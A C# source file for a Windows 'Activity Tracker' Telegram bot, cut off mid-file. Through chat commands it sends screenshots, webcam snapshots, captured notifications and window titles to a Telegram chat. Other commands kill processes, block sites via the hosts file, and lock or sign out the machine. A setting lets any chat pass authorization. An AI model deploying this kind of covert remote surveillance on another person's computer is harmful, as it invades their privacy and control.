using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Activity_Tracker.Telegram;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace Activity_Tracker
{
    /// <summary>
    /// Service that listens for Telegram commands and controls activity tracking
    /// </summary>
    public class TelegramCommandService : BackgroundService
    {
        #region Fields

        private readonly ILogger<TelegramCommandService> _logger;
        private readonly Worker _worker;
        private readonly LocalStorageService _storageService;
        private readonly ITelegramBotClient _botClient;
        private readonly IServiceProvider _serviceProvider;
        private readonly IHostApplicationLifetime _hostApplicationLifetime;
        private readonly string _chatId;
        private readonly bool _allowMultipleUsers;

        private readonly object _lock = new();
        private CancellationTokenSource? _pollingCts;

        #endregion

        #region Constructor

        public TelegramCommandService(
            ILogger<TelegramCommandService> logger,
            Worker worker,
            LocalStorageService storageService,
            ITelegramBotClient botClient,
            IServiceProvider serviceProvider,
            IConfiguration configuration,
            IHostApplicationLifetime hostApplicationLifetime)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _worker = worker ?? throw new ArgumentNullException(nameof(worker));
            _storageService = storageService ?? throw new ArgumentNullException(nameof(storageService));
            _botClient = botClient ?? throw new ArgumentNullException(nameof(botClient));
            _serviceProvider = serviceProvider ?? throw new ArgumentNullException(nameof(serviceProvider));
            _hostApplicationLifetime = hostApplicationLifetime ?? throw new ArgumentNullException(nameof(hostApplicationLifetime));

            _chatId = configuration["Telegram:ChatId"]
                ?? throw new InvalidOperationException("Telegram:ChatId is missing");

            _allowMultipleUsers = configuration.GetValue("Telegram:AllowMultipleUsers", false);

            _logger.LogInformation("⌨️ Telegram Command Service initialized");
        }

        public bool IsAuthorized(string chatId) =>
            _allowMultipleUsers || chatId == _chatId;

        #endregion

        #region Background Service Implementation

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();

        private bool IsActiveConsoleSession()
        {
            try
            {
                uint activeSessionId = WTSGetActiveConsoleSessionId();
                if (activeSessionId == 0xFFFFFFFF)
                {
                    return false;
                }

                uint currentSessionId = (uint)System.Diagnostics.Process.GetCurrentProcess().SessionId;
                return currentSessionId == activeSessionId;
            }
            catch (Exception ex)
            {
                _logger.LogWarning(ex, "Failed to determine if running in active console session");
                return true; // Fallback to true to ensure it works
            }
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            _logger.LogInformation("⌨️ Telegram Command Service starting...");

            await Task.Delay(TimeSpan.FromSeconds(3), stoppingToken);

            await RegisterBotCommandsAsync(stoppingToken);
            await SendWelcomeMessageAsync(stoppingToken);

            // Resolved here to avoid circular DI: CommandService <-> UpdateDispatcher
            var dispatcher = _serviceProvider.GetRequiredService<TelegramUpdateDispatcher>();

            var receiverOptions = new ReceiverOptions
            {
                AllowedUpdates = [UpdateType.Message, UpdateType.CallbackQuery]
            };

            bool wasActive = false;

            while (!stoppingToken.IsCancellationRequested)
            {
                bool isActive = IsActiveConsoleSession();

                if (isActive && !wasActive)
                {
                    lock (_lock)
                    {
                        if (_pollingCts == null || _pollingCts.IsCancellationRequested)
                        {
                            _logger.LogInformation("🔄 Session became active. Starting Telegram polling for user '{User}'...", Environment.UserName);
                            _pollingCts = CancellationTokenSource.CreateLinkedTokenSource(stoppingToken);
                            _botClient.StartReceiving(
                                async (bot, update, ct) => await dispatcher.DispatchAsync(update, ct),
                                HandlePollingErrorAsync,
                                receiverOptions,
                                _pollingCts.Token);
                        }
                    }
                    wasActive = true;
                }
                else if (!isActive && wasActive)
                {
                    lock (_lock)
                    {
                        if (_pollingCts != null && !_pollingCts.IsCancellationRequested)
                        {
                            _logger.LogInformation("💤 Session became inactive. Stopping Telegram polling for user '{User}' to avoid conflicts...", Environment.UserName);
                            _pollingCts.Cancel();
                            _pollingCts.Dispose();
                            _pollingCts = null;
                        }
                    }
                    wasActive = false;
                }
                else if (isActive && wasActive)
                {
                    // Ensure the initial start takes place if we boot straight into active state
                    lock (_lock)
                    {
                        if (_pollingCts == null || _pollingCts.IsCancellationRequested)
                        {
                            _logger.LogInformation("🚀 Initializing Telegram polling for active user '{User}'...", Environment.UserName);
                            _pollingCts = CancellationTokenSource.CreateLinkedTokenSource(stoppingToken);
                            _botClient.StartReceiving(
                                async (bot, update, ct) => await dispatcher.DispatchAsync(update, ct),
                                HandlePollingErrorAsync,
                                receiverOptions,
                                _pollingCts.Token);
                        }
                    }
                }

                // Check session active console changes every 2 seconds
                await Task.Delay(TimeSpan.FromSeconds(2), stoppingToken);
            }

            // Cleanup when stopping
            lock (_lock)
            {
                if (_pollingCts != null)
                {
                    _pollingCts.Cancel();
                    _pollingCts.Dispose();
                    _pollingCts = null;
                }
            }

            _logger.LogInformation("⌨️ Telegram Command Service stopping...");
        }

        private Task HandlePollingErrorAsync(ITelegramBotClient bot, Exception exception, CancellationToken cancellationToken)
        {
            _logger.LogError(exception, "❌ Telegram polling error");
            return Task.CompletedTask;
        }

        #endregion

        #region Command Processing

        /// <summary>
        /// Processes a slash/text command from Telegram.
        /// </summary>
        public async Task ProcessTextCommandAsync(string chatId, string userName, string text, CancellationToken cancellationToken)
        {
            // Intercept /kill command with arguments
            if (text.StartsWith("/kill", StringComparison.OrdinalIgnoreCase))
            {
                await HandleKillCommandAsync(chatId, text, cancellationToken);
                return;
            }

            // Intercept /block command
            if (text.StartsWith("/block", StringComparison.OrdinalIgnoreCase))
            {
                await HandleBlockCommandAsync(chatId, text, cancellationToken);
                return;
            }

            // Intercept /unblock command
            if (text.StartsWith("/unblock", StringComparison.OrdinalIgnoreCase))
            {
                await HandleUnblockCommandAsync(chatId, text, cancellationToken);
                return;
            }

            // Intercept /history command
            if (text.StartsWith("/history", StringComparison.OrdinalIgnoreCase))
            {
                await HandleHistoryCommandAsync(chatId, text, cancellationToken);
                return;
            }

            // Intercept /msg command
            if (text.StartsWith("/msg", StringComparison.OrdinalIgnoreCase))
            {
                await HandleMsgCommandAsync(chatId, text, cancellationToken);
                return;
            }

            // Intercept /open command
            if (text.StartsWith("/open", StringComparison.OrdinalIgnoreCase))
            {
                await HandleOpenCommandAsync(chatId, text, cancellationToken);
                return;
            }

            // Parse and execute command
            switch (text.ToLower())
            {
                case "/help":
                    await HandleHelpCommandAsync(chatId, userName, cancellationToken);
                    break;

                case "/menu":
                    await SendMainMenuAsync(chatId, userName, cancellationToken);
                    break;

                case "/track":
                case "/starttracking":
                    await HandleTrackCommandAsync(chatId, userName, cancellationToken);
                    break;

                case "/stop":
                case "/stoptracking":
                    await HandleStopCommandAsync(chatId, userName, cancellationToken);
                    break;

                case "/status":
                    await HandleStatusCommandAsync(chatId, userName, cancellationToken);
                    break;

                case "/whoami":
                case "/user":
                    await HandleWhoamiCommandAsync(chatId, userName, cancellationToken);
                    break;

                case "/persistence":
                case "/persist":
                    await HandlePersistenceCommandAsync(chatId, cancellationToken);
                    break;

                case "/stats":
                case "/statistics":
                    await HandleStatisticsCommandAsync(chatId, cancellationToken);
                    break;

                case "/pending":
                    await HandlePendingCommandAsync(chatId, cancellationToken);
                    break;

                case "/clear":
                    await HandleClearCommandAsync(chatId, cancellationToken);
                    break;

                case "/current":
                case "/active":
                    await HandleCurrentCommandAsync(chatId, cancellationToken);
                    break;

                case "/screenshot":
                case "/capture":
                    await HandleScreenshotCommandAsync(chatId, cancellationToken);
                    break;

                case "/lock":
                    await HandleLockCommandAsync(chatId, cancellationToken);
                    break;

                case "/sleep":
                    await HandleSleepCommandAsync(chatId, cancellationToken);
                    break;

                case "/sysinfo":
                case "/system":
                    await HandleSysInfoCommandAsync(chatId, cancellationToken);
                    break;

                case "/users":
                    await HandleUsersCommandAsync(chatId, cancellationToken);
                    break;

                case "/webcam":
                case "/camera":
                    await HandleWebcamCommandAsync(chatId, cancellationToken);
                    break;

                case "/processes":
                case "/ps":
                    await HandleProcessesCommandAsync(chatId, cancellationToken);
                    break;

                case "/notifications":
                case "/notifs":
                    await HandleNotificationsCommandAsync(chatId, cancellationToken);
                    break;

                case "/signout":
                case "/logoff":
                    await HandleSignoutCommandAsync(chatId, cancellationToken);
                    break;


                case "/shutdown":
                case "/exit":
                case "/quit":
                    await HandleShutdownCommandAsync(chatId, cancellationToken);
                    break;

                default:
                    await HandleUnknownCommandAsync(chatId, text, cancellationToken);
                    break;
            }
        }

        #endregion

        #region Command Handlers

        /// <summary>
        /// Handles /help and /start commands
        /// </summary>
        public async Task HandleHelpCommandAsync(string chatId, string userName, CancellationToken cancellationToken)
        {
            var safeName = TelegramUiMenus.EscapeHtml(userName);
            var message = $"""
                <b>👋 Hello {safeName}!</b>

                I'm <b>Activity Tracker Bot</b> 🕵️‍♂️

                <b>Control:</b> /track /stop /status /whoami /current /persistence
                <b>Data:</b> /stats /history /pending /notifications /clear
                <b>Utility:</b> /screenshot /webcam /sysinfo /users /processes /lock /sleep /signout
                <b>Advanced:</b> /msg /open /kill /block /unblock /shutdown

                Send <code>/menu</code> for the button control panel.
                """;

            await SendUiMessageAsync(message, chatId, TelegramUiMenus.MainMenu, cancellationToken);
        }

        /// <summary>
        /// Handles /track command - starts activity tracking
        /// </summary>
        public async Task HandleTrackCommandAsync(string chatId, string userName, CancellationToken cancellationToken)
        {
            lock (_lock)
            {
                _logger.LogInformation("▶️ Starting tracking for user: {User}", userName);
                _worker.StartTracking();
            }

            var message = $"""
            ✅ *Tracking Started!*
            
            I'm now monitoring activity on your computer.
            
            • I'll report application usage every time you switch windows
            • Sessions shorter than 15 seconds are ignored
            • Reports are sent in real-time when online
            • Offline reports are stored and sent when connection is restored
            
            Send /stop to pause tracking.
            Send /status to check current status.
            """;

            await SendMessageAsync(message, chatId, cancellationToken);
        }

        /// <summary>
        /// Handles /stop command - stops activity tracking
        /// </summary>
        public async Task HandleStopCommandAsync(string chatId, string userName, CancellationToken cancellationToken)
        {
            lock (_lock)
            {
                _logger.LogInformation("⏸️ Stopping tracking for user: {User}", userName);
                _worker.StopTracking();
            }

            var message = $"""
            ⏸️ *Tracking Stopped!*
            
            I'm no longer monitoring activity.
            
            Send /track to start monitoring again.
            Send /stats to view your activity statistics.
            """;

            await SendMessageAsync(message, chatId, cancellationToken);
        }

        /// <summary>
        /// Handles /whoami command - shows current Windows account
        /// </summary>
        public async Task HandleWhoamiCommandAsync(string chatId, string userName, CancellationToken cancellationToken)
        {
            var currentUserName = Environment.UserName;
            var machineName = Environment.MachineName;

            var message = $"""
            👤 *Current User Account*

            • *Username:* `{currentUserName}`
            • *Computer:* `{machineName}`
            • *Domain:* `{Environment.UserDomainName}`

            This is the Windows account currently being tracked by Activity Tracker.
            """;

            var keyboard = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("✅ Confirmed", $"whoami_confirmed_{currentUserName}")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🔄 Refresh", "whoami_refresh")
                }
            });

            await SendUiMessageAsync(message, chatId, keyboard, cancellationToken);
        }

        /// <summary>
        /// Handles /status command - shows current tracking status
        /// </summary>
        public async Task HandleStatusCommandAsync(string chatId, string userName, CancellationToken cancellationToken)
        {
            // Check if we're currently tracking
            bool isTracking = _worker.IsTrackingEnabled;
            bool isIdle = _worker.IsIdle;

            string trackingStatus = isTracking ? "ACTIVE ✅" : "PAUSED ⏸️";
            if (isTracking && isIdle)
            {
                trackingStatus = "IDLE (AFK) 💤";
            }

            // Check internet connectivity
            bool isOnline = await CheckInternetConnectionAsync();

            // Get storage statistics
            var stats = _storageService.GetStatistics();

            var message = $"""
            📊 *Current Status*
            
            • *User Account:* `{Environment.UserName}` 👤
            • *Tracking:* {trackingStatus}
            • *Internet:* {(isOnline ? "ONLINE 🌐" : "OFFLINE 📶")}
            • *Pending Reports:* {stats.PendingCount}
            • *Total Reports:* {stats.TotalCount}
            • *Storage:* {stats.ActiveFileSize + stats.SentFileSize + stats.FailedFileSize:F2} MB
            
            *Commands:*
            {(isTracking ? "/stop - Pause tracking" : "/track - Start tracking")}
            /stats - View detailed statistics
            /pending - Show pending reports
            """;

            await SendMessageAsync(message, chatId, cancellationToken);
        }

        /// <summary>
        /// Handles /stats command - shows detailed statistics
        /// </summary>
        public async Task HandleStatisticsCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            var stats = _storageService.GetStatistics();

            var message = $"""
            📈 *Activity Statistics*
            
            *Storage Summary:*
            • Total Reports: {stats.TotalCount}
            • Pending/Unsent: {stats.PendingCount}
            • Successfully Sent: {stats.SentCount}
            • Failed: {stats.FailedCount}
            
            *Storage Usage:*
            • Active File: {stats.ActiveFileSize} MB
            • Sent Archive: {stats.SentFileSize} MB
            • Failed Archive: {stats.FailedFileSize} MB
            • Total: {stats.ActiveFileSize + stats.SentFileSize + stats.FailedFileSize:F2} MB
            
            *Storage Location:*
            `{stats.StorageDirectory}`
            
            *Note:* Pending reports are stored locally when offline and sent when connection is restored.
            """;

            await SendMessageAsync(message, chatId, cancellationToken);
        }

        /// <summary>
        /// Handles /pending command - shows pending/unsent reports
        /// </summary>
        public async Task HandlePendingCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                var pendingReports = _storageService.GetPendingReports(10); // Max 10 retry attempts

                if (!pendingReports.Any())
                {
                    await SendMessageAsync("✅ *No pending reports!* All reports have been sent successfully.",
                        chatId, cancellationToken);
                    return;
                }

                var message = new StringBuilder();
                message.AppendLine($"⏳ *Pending Reports ({pendingReports.Count}):*");
                message.AppendLine();

                foreach (var report in pendingReports.Take(10)) // Show first 10
                {
                    var duration = DurationFormatter.Format(report.DurationSeconds);
                    var time = report.Timestamp.ToString("HH:mm");
                    message.AppendLine($"• `{report.AppName}` - {duration} at {time}");
                }

                if (pendingReports.Count > 10)
                {
                    message.AppendLine($"... and {pendingReports.Count - 10} more");
                }

                message.AppendLine();
                message.AppendLine("These reports will be sent when internet connection is restored.");

                await SendMessageAsync(message.ToString(), chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error getting pending reports");
                await SendMessageAsync("❌ Error retrieving pending reports.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /notifications command - shows recent captured notifications
        /// </summary>
        public async Task HandleNotificationsCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                var list = _storageService.LoadNotifications();
                if (!list.Any())
                {
                    await SendMessageAsync("🔔 *No captured notifications!*", chatId, cancellationToken);
                    return;
                }

                var sb = new StringBuilder();
                sb.AppendLine("🔔 <b>Recent Captured Notifications:</b>");
                sb.AppendLine();

                foreach (var notif in list.Take(10)) // Show top 10
                {
                    string time = notif.Timestamp.ToString("HH:mm");
                    string app = TelegramUiMenus.EscapeHtml(notif.AppName);
                    string title = TelegramUiMenus.EscapeHtml(notif.Title);
                    string message = TelegramUiMenus.EscapeHtml(notif.Message);

                    sb.AppendLine($"• <b>[{app}]</b> at <code>{time}</code>");
                    if (!string.IsNullOrEmpty(title))
                    {
                        sb.AppendLine($"  <b>{title}</b>");
                    }
                    if (!string.IsNullOrEmpty(message))
                    {
                        sb.AppendLine($"  {message}");
                    }
                    sb.AppendLine();
                }

                await SendHtmlMessageAsync(sb.ToString(), chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /notifications command");
                await SendMessageAsync("❌ Error retrieving notifications.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /signout command - signs out the active user session
        /// </summary>
        public async Task HandleSignoutCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendMessageAsync("🚶 *Signing out active user session...*", chatId, cancellationToken);
                // Delay to give the message time to send
                await Task.Delay(1500, cancellationToken);
                
                // Run signout command
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "shutdown.exe",
                    Arguments = "/l",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling signout command");
                await SendMessageAsync("❌ Failed to execute signout command.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /clear command - clears all pending reports
        /// </summary>
        public async Task HandleClearCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                _storageService.ClearPendingReports();
                var message = """
                🗑️ *Clear Pending Reports*

                All pending/unsent reports have been cleared from local storage.
                """;
                await SendMessageAsync(message, chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error clearing pending reports");
                await SendMessageAsync("❌ Error clearing pending reports from local storage.", chatId, cancellationToken);
            }
        }


        /// <summary>
        /// Handles /current and /active commands - gets current active window
        /// </summary>
        public async Task HandleCurrentCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                var (appName, windowTitle) = _worker.GetCurrentActiveWindow();

                var message = $"""
                👁️ *Current Active Window*
                
                • *Application:* `{appName}`
                • *Title:* {windowTitle}
                """;

                await SendMessageAsync(message, chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error getting current active window");
                await SendMessageAsync("❌ Error getting current active window.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /screenshot and /capture commands - takes a screenshot and sends it to the user
        /// </summary>
        public async Task HandleScreenshotCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                // Send a typing/uploading photo action to make it feel responsive
                await SendChatActionAsync(chatId, "upload_photo", cancellationToken);

                // Capture screenshot
                byte[]? photoBytes = _worker.CaptureScreenshot();

                if (photoBytes == null || photoBytes.Length == 0)
                {
                    await SendMessageAsync("❌ Failed to capture screenshot. The system might be locked or inactive.", chatId, cancellationToken);
                    return;
                }

                // Send the captured screenshot
                string filename = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                string caption = $"📸 *Screenshot Captured*\n\n• *Time:* {DateTime.Now:HH:mm:ss}\n• *Date:* {DateTime.Now:yyyy-MM-dd}";

                await SendPhotoAsync(photoBytes, filename, chatId, caption, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error executing screenshot command");
                await SendMessageAsync("❌ An unexpected error occurred while capturing screen.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /lock command - locks the workstation screen
        /// </summary>
        public async Task HandleLockCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                bool success = _worker.LockWorkstation();
                if (success)
                {
                    await SendMessageAsync("🔒 *Workstation Locked Successfully*", chatId, cancellationToken);
                }
                else
                {
                    await SendMessageAsync("❌ *Failed to Lock Workstation*", chatId, cancellationToken);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /lock command");
                await SendMessageAsync("❌ Error locking workstation.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /sleep command - puts workstation to sleep
        /// </summary>
        public async Task HandleSleepCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendMessageAsync("💤 *Sending sleep command...*", chatId, cancellationToken);
                // Pause tracking first so it doesn't try to log during transition
                _worker.StopTracking();
                
                bool success = _worker.SleepWorkstation();
                if (!success)
                {
                    await SendMessageAsync("❌ *Failed to enter sleep state*", chatId, cancellationToken);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /sleep command");
                await SendMessageAsync("❌ Error suspending workstation.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /sysinfo command - gets resource specifications
        /// </summary>
        public async Task HandleSysInfoCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                var (totalRam, usedRam, ramPercent, totalDisk, freeDisk, uptime) = _worker.GetSystemSpecs();
                
                string uptimeFormatted = string.Format("{0:00}:{1:00}:{2:00}", 
                    (int)uptime.TotalHours, uptime.Minutes, uptime.Seconds);

                var message = $"""
                💻 *System Resource Specifications*
                
                • *RAM Usage:* `{usedRam:F2} / {totalRam:F2} GB` ({ramPercent}%)
                • *Disk Space (C:):* `{totalDisk - freeDisk:F2} / {totalDisk:F2} GB` (`{freeDisk:F2} GB` free)
                • *System Uptime:* `{uptimeFormatted}`
                • *OS Platform:* `Windows`
                """;

                await SendMessageAsync(message, chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /sysinfo command");
                await SendMessageAsync("❌ Error retrieving system specifications.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /users command - lists local computer user accounts
        /// </summary>
        public async Task HandleUsersCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                var users = _worker.GetLocalUsers();
                if (users == null || users.Count == 0)
                {
                    await SendMessageAsync("⚠️ No local users found.", chatId, cancellationToken);
                    return;
                }

                var sb = new StringBuilder();
                sb.AppendLine("👥 *Local User Accounts*");
                sb.AppendLine();

                foreach (var user in users)
                {
                    string statusEmoji = user.isEnabled ? "🟢" : "🔴";
                    string statusText = user.isEnabled ? "Active" : "Disabled";
                    
                    sb.AppendLine($"• *{user.name}* {statusEmoji}");
                    sb.AppendLine($"  Status: `{statusText}`");
                    if (!string.IsNullOrEmpty(user.description))
                    {
                        sb.AppendLine($"  Description: _{user.description}_");
                    }
                    sb.AppendLine();
                }

                await SendMessageAsync(sb.ToString(), chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /users command");
                await SendMessageAsync("❌ Error retrieving user accounts.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /webcam and /camera commands - takes a webcam snapshot and sends it to the user
        /// </summary>
        public async Task HandleWebcamCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendChatActionAsync(chatId, "upload_photo", cancellationToken);

                byte[]? photoBytes = await _worker.CaptureWebcamImageAsync();

                if (photoBytes == null || photoBytes.Length == 0)
                {
                    await SendMessageAsync("❌ Failed to capture webcam image. No camera detected or device is in use.", chatId, cancellationToken);
                    return;
                }

                string filename = $"webcam_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
                string caption = $"📸 *Webcam Snapshot*\n\n• *Time:* {DateTime.Now:HH:mm:ss}\n• *Date:* {DateTime.Now:yyyy-MM-dd}";

                await SendPhotoAsync(photoBytes, filename, chatId, caption, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error executing webcam snapshot command");
                await SendMessageAsync("❌ An unexpected error occurred while capturing webcam snapshot.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /processes and /ps commands - lists top processes by memory usage
        /// </summary>
        public async Task HandleProcessesCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                var list = _worker.GetTopMemoryProcesses(10);
                if (list == null || list.Count == 0)
                {
                    await SendMessageAsync("⚠️ No processes found.", chatId, cancellationToken);
                    return;
                }

                var sb = new StringBuilder();
                sb.AppendLine("⚙️ *Top 10 Active Processes (by Memory)*");
                sb.AppendLine();

                foreach (var p in list)
                {
                    sb.AppendLine($"• `{p.name}` (PID: `{p.pid}`) — `{p.memoryMb:F1} MB`");
                }

                sb.AppendLine();
                sb.AppendLine("💡 _To terminate an app, use:_");
                sb.AppendLine("`/kill <PID>` or `/kill <Name>`");

                await SendMessageAsync(sb.ToString(), chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /processes command");
                await SendMessageAsync("❌ Error retrieving active processes list.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /kill command - terminates a process by PID or Name
        /// </summary>
        public async Task HandleKillCommandAsync(string chatId, string commandText, CancellationToken cancellationToken)
        {
            try
            {
                var parts = commandText.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length < 2)
                {
                    await SendMessageAsync("⚠️ *Usage:* `/kill <PID>` or `/kill <Name>`\n\nExample:\n• `/kill 14092`\n• `/kill chrome`", chatId, cancellationToken);
                    return;
                }

                string arg = parts[1];
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                if (int.TryParse(arg, out int pid))
                {
                    bool success = _worker.KillProcessById(pid, out string name);
                    if (success)
                    {
                        await SendMessageAsync($"💀 *Terminated Process:* `{name}` (PID: `{pid}`)", chatId, cancellationToken);
                    }
                    else
                    {
                        await SendMessageAsync($"❌ *Failed to Terminate Process:* PID `{pid}`\n\n_Note: It might be a protected system process or already closed._", chatId, cancellationToken);
                    }
                }
                else
                {
                    int count = _worker.KillProcessesByName(arg);
                    if (count > 0)
                    {
                        await SendMessageAsync($"💀 *Terminated {count} Process(es)* matching: `{arg}`", chatId, cancellationToken);
                    }
                    else
                    {
                        await SendMessageAsync($"❌ *No Processes Found* matching: `{arg}`\n\n_Note: The application name is case-sensitive (e.g. 'chrome', 'notepad')._", chatId, cancellationToken);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /kill command");
                await SendMessageAsync("❌ An unexpected error occurred while executing the terminate command.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /block command - adds an app or domain to the block list or lists current blocked items
        /// </summary>
        public async Task HandleBlockCommandAsync(string chatId, string commandText, CancellationToken cancellationToken)
        {
            try
            {
                var parts = commandText.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                
                if (parts.Length < 2)
                {
                    var blockedApps = _worker.GetBlockedApps();
                    var blockedDomains = _worker.GetBlockedDomains();

                    if (blockedApps.Count == 0 && blockedDomains.Count == 0)
                    {
                        await SendMessageAsync("🛡️ *Blocklist is Empty.*\n\n💡 _To block, use:_ `/block <Name>`\n• Apps: `/block discord`\n• Websites: `/block youtube.com`", chatId, cancellationToken);
                        return;
                    }

                    var sb = new StringBuilder();
                    sb.AppendLine("🛡️ *Active Policies & Blocklist:*");
                    sb.AppendLine();

                    if (blockedApps.Count > 0)
                    {
                        sb.AppendLine("📱 *Blocked Applications:*");
                        foreach (var app in blockedApps)
                        {
                            sb.AppendLine($"• `{app}`");
                        }
                        sb.AppendLine();
                    }

                    if (blockedDomains.Count > 0)
                    {
                        sb.AppendLine("🌐 *Blocked Web Domains:*");
                        foreach (var domain in blockedDomains)
                        {
                            sb.AppendLine($"• `{domain}`");
                        }
                        sb.AppendLine();
                    }

                    sb.AppendLine("💡 _To unblock, use:_ `/unblock <Name>`");
                    await SendMessageAsync(sb.ToString(), chatId, cancellationToken);
                    return;
                }

                string target = parts[1];
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                if (target.Contains('.'))
                {
                    // Block Domain
                    bool added = _worker.BlockDomain(target);
                    if (added)
                    {
                        bool isAdmin = _worker.IsRunningAsAdmin();
                        var sb = new StringBuilder();
                        sb.AppendLine($"🚫 *Added Website to Blocklist:* `{target}`");
                        sb.AppendLine();
                        sb.AppendLine("🛡️ *Enforcement Status:*");
                        sb.AppendLine(isAdmin 
                            ? "• *Strategy A (hosts redirect):* ✅ Enabled (System-wide blocking active)" 
                            : "• *Strategy A (hosts redirect):* ⚠️ Skipped (Requires Administrator privileges)");
                        sb.AppendLine("• *Strategy B (Tab Closure Guard):* ✅ Active (Inspecting browser window titles and address bars to close tabs)");

                        await SendMessageAsync(sb.ToString(), chatId, cancellationToken);
                    }
                    else
                    {
                        await SendMessageAsync($"⚠️ Website `{target}` is already in the blocklist.", chatId, cancellationToken);
                    }
                }
                else
                {
                    // Block App
                    bool added = _worker.BlockApp(target);
                    if (added)
                    {
                        int killedCount = _worker.KillProcessesByName(target);
                        string details = killedCount > 0 
                            ? $"\n\n💀 *Enforced immediately:* Terminated {killedCount} running instance(s)\\." 
                            : string.Empty;

                        await SendMessageAsync($"🚫 *Added App to Blocklist:* `{target}`{details}", chatId, cancellationToken);
                    }
                    else
                    {
                        await SendMessageAsync($"⚠️ Application `{target}` is already in the blocklist.", chatId, cancellationToken);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /block command");
                await SendMessageAsync("❌ Error managing blocklist.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /unblock command - removes an app or domain from the block list
        /// </summary>
        public async Task HandleUnblockCommandAsync(string chatId, string commandText, CancellationToken cancellationToken)
        {
            try
            {
                var parts = commandText.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length < 2)
                {
                    await SendMessageAsync("⚠️ *Usage:* `/unblock <Name>`\n\nExample:\n• `/unblock discord`\n• `/unblock youtube.com`", chatId, cancellationToken);
                    return;
                }

                string target = parts[1];
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                if (target.Contains('.'))
                {
                    // Unblock Domain
                    bool removed = _worker.UnblockDomain(target);
                    if (removed)
                    {
                        await SendMessageAsync($"🟢 *Removed Website from Blocklist:* `{target}`\n\n_Note: You can now access this website normally._", chatId, cancellationToken);
                    }
                    else
                    {
                        await SendMessageAsync($"⚠️ Website `{target}` was not found in the blocklist.", chatId, cancellationToken);
                    }
                }
                else
                {
                    // Unblock App
                    bool removed = _worker.UnblockApp(target);
                    if (removed)
                    {
                        await SendMessageAsync($"🟢 *Removed App from Blocklist:* `{target}`\n\n_Note: You can now launch this application normally._", chatId, cancellationToken);
                    }
                    else
                    {
                        await SendMessageAsync($"⚠️ Application `{target}` was not found in the blocklist.", chatId, cancellationToken);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /unblock command");
                await SendMessageAsync("❌ Error updating blocklist.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /history [limit] command
